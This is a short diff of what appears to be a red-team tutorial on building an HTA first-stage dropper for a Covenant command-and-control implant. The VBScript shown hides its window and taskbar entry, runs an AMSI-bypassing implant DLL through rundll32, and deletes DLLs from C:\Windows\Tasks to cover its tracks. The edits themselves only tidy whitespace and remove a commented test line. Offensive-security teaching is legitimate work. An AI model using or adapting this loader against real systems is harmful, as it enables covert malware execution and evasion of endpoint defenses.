@@ -640,8 +640,6 @@ First of all we need to craft our HTA (first stage) file that will deliver our G
 <HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" />
 <script type="text/vbscript">
 
-
-
 ' ===================================
 ' Download Clause
 ' Tested with binaries - works!
@@ -693,11 +691,10 @@ End Sub
 Dim sh  
 Set sh = CreateObject("Wscript.Shell")  
 Call sh.Run("rundll32 covenant-DLL-noAmsi.dll,MonkEntry")
-'sh.Run("calc")
 target_folder = "C:\Windows\Tasks"
 Set fs = CreateObject("Scripting.Filesystemobject")
 fs.DeleteFile( target_folder & "\*.dll" )
-Set sh = Nothing  
+Set sh = Nothing 
 
 </script>
 </head>
